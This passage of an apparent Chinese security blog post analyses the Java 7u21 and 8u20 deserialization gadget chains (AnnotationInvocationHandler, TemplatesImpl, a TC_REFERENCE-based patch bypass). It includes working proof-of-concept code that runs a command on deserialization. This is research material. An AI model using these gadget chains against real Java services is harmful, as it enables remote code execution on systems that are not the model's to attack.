@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Java 7u21/8u20 反序列化漏洞 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期三, 十月 21日 2020, 10:57 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      8 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 非常特别的反序列化链，虽然可用范围很小，但是用到的类都在 JDK 内部。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="7u21"><a href="#7u21" class="headerlink" title="7u21"></a>7u21</h3><p>观察到参考文章里面的修复方式是对 AnnotationInvocationHandler 类的 this.type 属性做了限制，所以找找用到这个属性的地方，找到 getMemberMethods 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.<span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">                AccessibleObject.setAccessible(var1, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> var1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.memberMethods;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数中会使用反射根据 type 属性获取某个 Class 中定义的函数，再找找调用了 getMemberMethods 函数的地方：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="built_in">this</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="built_in">this</span>.getMemberMethods();</span><br><span class="line">        <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">var5</span> <span class="operator">=</span> var2[var4];</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getName();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var6);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">AnnotationInvocationHandler</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="built_in">this</span>.asOneOfUs(var1);</span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">            	var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                	var8 = var5.invoke(var1);</span><br><span class="line">                &#125; </span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是在参数为 type 的实例的时候，可以按顺序调用某个类&#x2F;接口的函数，但是如果调用了有参函数就会抛出异常结束执行，所以选择类&#x2F;接口的时候要注意其函数的顺序。</p>
+<p>而我们的好朋友 TemplatesImpl 类继承了 Templates 接口，里面只有两个函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Templates</span> &#123;</span><br><span class="line"></span><br><span class="line">    Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException;</span><br><span class="line"></span><br><span class="line">    Properties <span class="title function_">getOutputProperties</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这两个函数都可以出发我们熟悉的 TemplatesImpl 从字节码中定义、加载类的操作，所以可以用这种方式进行 RCE。</p>
+<p>equalsImpl 这个名字明显与 equals 相关，调用代码在 invoke 中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用 AnnotationInvocationHandler 代理 equals，就能触发上面的反射调用函数。而 readObject 中会触发 equals 的类也挺多的， 比如 HashSet、HashTable 等等。</p>
+<p>maven 弄个适用于 JDK7 的低版本 javassist：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.18.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试代码（使用 HashTable 需要注意一下保证 hashCode 一致）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(testJavassist.class.getName());</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(code);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">clazz.setSuperclass(superClass);</span><br><span class="line"><span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwn&quot;</span>);</span><br><span class="line">setField(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.newInstance());</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">2</span>);</span><br><span class="line">map.put(<span class="string">&quot;&quot;</span>, templates);</span><br><span class="line">Constructor&lt;?&gt; constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Templates.class, map);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(map.getClass().getClassLoader(), map.getClass().getInterfaces(), annotationInvocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">hashtable.put(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">Object[] table = (Object[]) getFieldValue(hashtable, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">setField(table[<span class="number">5</span>], <span class="string">&quot;key&quot;</span>, templates);</span><br><span class="line">setField(table[<span class="number">6</span>], <span class="string">&quot;key&quot;</span>, mapProxy);</span><br><span class="line"></span><br><span class="line">unserialize(serialize(hashtable));</span><br></pre></td></tr></table></figure>
+
+<h3 id="8u20"><a href="#8u20" class="headerlink" title="8u20"></a>8u20</h3><p>在 AnnotationInvocationHandler 类中的修复如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 readObject 函数中进行了限制，如果 type 属性不是注解类型，就会抛出异常直接中断反序列化进程。</p>
+<p>但是对 Java 反序列化有一点了解的师傅都知道，异常是在 readObject 函数中抛出的，此时该对象的大部分数据已经完成了反序列化，剩下还没反序列化的就是 writeObject 函数中额外写入的函数（如 writeObject、writeInt 等）。</p>
+<p>而 AnnotationInvocationHandler 类中并没有 writeObject 函数，也就是说此时 AnnotationInvocationHandler 对象其实已经反序列化完成了，只是被抛出的异常中断了流程。所以只要解决这个抛出的异常，我们就能绕过这个修复继续 RCE，而解决异常的方法一般来说就是 try&#x2F;catch，比如在某个类的 readObject 函数中，有一块 try&#x2F;catch 的代码块里面调用了 readObject 还原 writeObject 写入的额外数据。</p>
+<p>但这样一来即使捕获了异常没有中断反序列化，反序列化出来的这个 AnnotationInvocationHandler 对象多半也会因为抛出了异常而不会保存下来，变成一个只存在于内存，无法访问的“幽灵”对象。</p>
+<p>按照 payload 原作者的思路，要访问这个“幽灵”对象，就要用到一个 Java 反序列化的机制 REFERENCE，用 <a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a> 查看将一个对象写入两次生成的序列化数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 15 - 0x00 0f</span><br><span class="line">        Value - org.example.Foo - 0x6f72672e6578616d706c652e466f6f</span><br><span class="line">      serialVersionUID - 0x74 83 16 48 f2 29 b7 cf</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 0 - 0x00 00</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 01</span><br><span class="line">    classdata</span><br><span class="line">      org.example.Foo</span><br><span class="line">        values</span><br><span class="line">  TC_REFERENCE - 0x71</span><br><span class="line">    Handle - 8257537 - 0x00 7e 00 01</span><br></pre></td></tr></table></figure>
+
+<p>因为同一个对象写入了两次，而为了反序列化的简便肯定不会将相同数据写入两次，所以第二次写入的时候写入的就不是对象，而是一个 REFERENCE 引用，指向前面的对象，反序列化的时候就能知道这里是个与前面相同的数据。</p>
+<p>按照原作者的思路，这里构造 payload 要自行编写字节码（因为是流式数据，所以按顺序写下去就行了），构造难度不高，阅读一遍原作者的源码就能明白。</p>
+<p>唯一有一个坑点的就是 AnnotationInvocationHandler 对象的 flag 字段，如果不加上代表 SC_WRITE_METHOD 的 1，在抛出异常后会导致后续的反序列化出错，理由不明（或许是因为没有实现 writeObject 函数的类，在 readObject 时不会有因为反序列化额外数据导致的异常，所以此时如果出现了异常就会直接中断反序列化）。</p>
+<p>我自己写了个 Hashtable 的利用链来巩固一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">    STREAM_MAGIC, STREAM_VERSION, <span class="comment">// 序列化数据头</span></span><br><span class="line">    TC_OBJECT,</span><br><span class="line">    TC_CLASSDESC,</span><br><span class="line">    Hashtable.class.getName(),</span><br><span class="line">    <span class="number">0x13bb0f25214ae4b8L</span>, <span class="comment">// serialVersionUID</span></span><br><span class="line">    (<span class="type">byte</span>) <span class="number">3</span>, <span class="comment">// flags (SC_SERIALIZABLE)</span></span><br><span class="line">    (<span class="type">short</span>) <span class="number">1</span>, <span class="comment">// field count</span></span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;F&#x27;</span>, <span class="string">&quot;loadFactor&quot;</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_NULL,</span><br><span class="line">    <span class="number">0.75f</span>,</span><br><span class="line">    TC_BLOCKDATA,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">8</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    TC_OBJECT,</span><br><span class="line">    TC_PROXYCLASSDESC,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    Map.class.getName(),</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_CLASSDESC,</span><br><span class="line">    Proxy.class.getName(),</span><br><span class="line">    -<span class="number">2222568056686623797L</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">2</span>,</span><br><span class="line">    (<span class="type">short</span>) <span class="number">2</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;L&#x27;</span>, <span class="string">&quot;foo&quot;</span>, TC_STRING, <span class="string">&quot;Ljava/lang/Object;&quot;</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;L&#x27;</span>, <span class="string">&quot;h&quot;</span>, TC_STRING, <span class="string">&quot;Ljava/lang/reflect/InvocationHandler;&quot;</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_NULL,</span><br><span class="line">    TC_OBJECT,</span><br><span class="line">    TC_CLASSDESC,</span><br><span class="line">    BeanContextSupport.class.getName(),</span><br><span class="line">    -<span class="number">4879613978649577204L</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">3</span>,</span><br><span class="line">    (<span class="type">short</span>) <span class="number">1</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;I&#x27;</span>, <span class="string">&quot;serializable&quot;</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_CLASSDESC,</span><br><span class="line">    BeanContextChildSupport.class.getName(),</span><br><span class="line">    <span class="number">6328947014421475877L</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">2</span>,</span><br><span class="line">    (<span class="type">short</span>) <span class="number">1</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;L&#x27;</span>, <span class="string">&quot;beanContextChildPeer&quot;</span>, TC_STRING, <span class="string">&quot;Ljava/beans/beancontext/BeanContextChild;&quot;</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_NULL,</span><br><span class="line">    TC_REFERENCE, baseWireHandle + <span class="number">0x0a</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    TC_OBJECT,</span><br><span class="line">    TC_CLASSDESC,</span><br><span class="line">    <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>,</span><br><span class="line">    <span class="number">6182022883658399397L</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">3</span>,</span><br><span class="line">    (<span class="type">short</span>) <span class="number">2</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;L&#x27;</span>, <span class="string">&quot;type&quot;</span>, TC_STRING, <span class="string">&quot;Ljava/lang/Class;&quot;</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;L&#x27;</span>, <span class="string">&quot;memberValues&quot;</span>, TC_STRING, <span class="string">&quot;Ljava/util/Map;&quot;</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_NULL,</span><br><span class="line">    Templates.class,</span><br><span class="line">    TC_OBJECT,</span><br><span class="line">    TC_CLASSDESC,</span><br><span class="line">    HashMap.class.getName(),</span><br><span class="line">    <span class="number">0x0507dac1c31660d1L</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">3</span>,</span><br><span class="line">    (<span class="type">short</span>) <span class="number">1</span>,</span><br><span class="line">    (<span class="type">byte</span>) <span class="string">&#x27;F&#x27;</span>, <span class="string">&quot;loadFactor&quot;</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_NULL,</span><br><span class="line">    <span class="number">0.75f</span>,</span><br><span class="line">    TC_BLOCKDATA,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">8</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    TC_STRING, <span class="string">&quot;&quot;</span>,</span><br><span class="line">    templates,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_BLOCKDATA,</span><br><span class="line">    (<span class="type">byte</span>) <span class="number">4</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">    TC_REFERENCE, baseWireHandle + <span class="number">0x0e</span>,</span><br><span class="line">    TC_STRING, <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">    TC_REFERENCE, baseWireHandle + <span class="number">0x1a</span>,</span><br><span class="line">    TC_STRING, <span class="string">&quot;Twings&quot;</span>,</span><br><span class="line">    TC_ENDBLOCKDATA,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>最后再 patch 一下，将 templates 中属性 _name 的引用 handler 改成某个 String 即可。</p>
+<p>理论上，传统构造方式应该也是可行的（给 AnnotationInvocationHandler 对象的 flag 加上 SC_WRITE_METHOD，再用 endorsed 修改一下 Proxy 等类，加上一个不存在的 Object 类型属性），但是比较麻烦就是了。</p>
+<hr>
